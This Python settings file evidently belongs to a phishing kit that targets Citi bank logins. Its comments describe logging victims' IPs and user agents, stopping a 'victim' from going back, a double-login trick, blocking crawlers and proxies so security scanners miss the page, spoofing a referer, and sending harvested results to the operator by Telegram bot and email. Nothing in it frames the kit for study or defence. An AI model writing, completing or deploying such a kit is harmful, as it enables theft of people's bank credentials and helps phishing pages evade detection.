import os


def _env_list(name, fallback=None):
    value = os.getenv(name)
    if value:
        return [item.strip() for item in value.split(',') if item.strip()]
    return list(fallback or [])


def _env_value(name, default=""):
    return os.getenv(name, default)


def _env_pairs(name, fallback=None):
    value = os.getenv(name)
    pairs = []
    if value:
        for item in value.split(','):
            item = item.strip()
            if not item or ':' not in item:
                continue
            token, chat_id = item.split(':', 1)
            token = token.strip()
            chat_id = chat_id.strip()
            if token and chat_id:
                pairs.append({"botToken": token, "chatId": chat_id})
    if pairs:
        return pairs
    return list(fallback or [])


_single_bot_token = _env_value("TELEGRAM_BOT_TOKEN")
_single_chat_id = _env_value("TELEGRAM_CHAT_ID")


app_settings = {
    "log_user": "1",  # Log User-Agent, IP and Date
    "print_match": "0",  # Print Crawler Detections
    "anti-back": "1",  # Victim Can't Go Back To Session
    "debug": "0",  # Print Errors
    "proxy_block": "1",  # Detect Proxies & Block Them
    "send_mail": "1",  # Send E-Mail To Your Mail
    "save_results": "1",  # Save Results
    "telegram": "1",  # Telegram Bots Receiver
    "country": "US",  # Target SPAM Country
    "double_login": "1",  # Double login

    "chat_id": _env_value("TELEGRAM_CHAT_ID"),  # Chat ID Of You
    "bot_url": _env_value("TELEGRAM_BOT_URL"),  # Your Bot API Key (ADD "bot" BEFORE API KEY)
    "email": _env_value("NOTIFICATION_EMAIL"),  # Your E-Mail

    "referer": "https://live.com/",  # HTTP Referer For Antibots
    "out": "citi+login",  # Outcome Of AntiBots Forward - DONT CHANGE



    ###########

    "botToken": _single_bot_token,
    "chatId": _single_chat_id,  # The chat ID of the recipient
    "telegram_bots": _env_pairs(
        "TELEGRAM_BOTS",
        fallback=[{"botToken": _single_bot_token, "chatId": _single_chat_id}]
        if _single_bot_token and _single_chat_id
        else [],
    ),

    'send_email_list': _env_list('EMAIL_RECIPIENTS'),
    'from_email': _env_value('DEFAULT_FROM_EMAIL', _env_value('EMAIL_HOST_USER')),
}

